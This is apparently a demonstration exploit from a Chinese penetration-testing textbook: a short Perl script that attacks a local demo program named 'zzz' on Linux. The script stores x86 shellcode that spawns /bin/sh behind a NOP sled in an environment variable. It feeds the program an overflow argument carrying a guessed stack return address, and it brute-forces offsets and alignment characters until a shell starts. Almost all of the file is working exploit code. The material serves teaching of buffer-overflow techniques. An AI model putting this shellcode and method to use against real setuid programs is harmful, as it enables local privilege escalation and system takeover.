#!/usr/bin/perl -w
#
# 《网络渗透技术》演示程序
# 作者：san, alert7, eyas, watercloud
#
# use to exploit zzz demo program on linux.
#
# usage ./ex.pl [off]
#       ./ex.pl -f
#         off : 0 - 256
#         -f  : force search the offset

$CMD="./zzz";
$SHELL="1\xc0PPP[YZ4\xd0\xcd\x80";
$SHELL.="j\x0bX\x99Rhn/shh//biT[RSTY\xcd\x80";
$OFF=50;

$OFF=$ARGV[0] if $ARGV[0] >0 ;
$f_force=1 if $ARGV[0] eq '-f' ;

%ENV={};$ENV{LOGNAME}="root";
$ARG="AA". "\xb0\xff\xff\xbf"x5 ."A";

for($off=0;$off<256;$off+=10){
  $off=$OFF if ! $f_force;
  $ENV{ABC}="\x90"x$off .$SHELL;
  foreach $a (0x61 .. 0x71) {
    printf "Offset=$off AligChar='%s'\n",chr($a);
    foreach (1 .. 3){
      exit 0 if ! system $CMD,$ARG.chr($a);
    }
  }
  last if ! $f_force;
}
#EOF
